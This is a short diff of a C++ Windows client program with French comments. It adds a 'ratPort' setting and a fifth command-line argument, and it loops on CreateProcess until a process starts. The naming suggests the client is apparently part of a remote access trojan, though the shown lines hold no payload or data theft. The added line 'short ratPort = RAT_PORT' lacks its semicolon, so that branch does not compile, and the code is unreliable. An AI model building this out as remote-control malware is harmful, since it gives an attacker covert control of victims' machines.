@@ -58,18 +58,21 @@ void main(int argc, char **argv)
 	//
 #ifdef HARD_CODED_ARGS
 	short nPort = MY_PORT;
+	short ratPort = RAT_PORT
 	char* server = SERVER_NAME;
 	string argFileName = FILE_NAME;
 
 #else
-	if (argc != 4)	{
-		cout<<"\nSyntax: client ServerName PortNumber FileName";
+	if (argc != 5)	{
+		cout<<"\nSyntax: client ServerName PortNumber FileName FilePortNumber";
 		cout<<endl;
 		return;
 	}
-	short nPort = atoi(argv[2]);
 	char* server = argv[1];
+	short nPort = atoi(argv[2]);
 	string argFileName = argv[3];
+	short ratPort = atoi(argv[4]);
+	
 #endif
 
 	//
@@ -101,7 +104,7 @@ void main(int argc, char **argv)
 		//temp[len] = '\0';
 
 		//Necessite jeu de caractere multi-octet
-		bool success = false;
+		int success = false;
 		DWORD exitCode;
 		while (!success){
 			success = CreateProcess(	//<--CreateProcessA
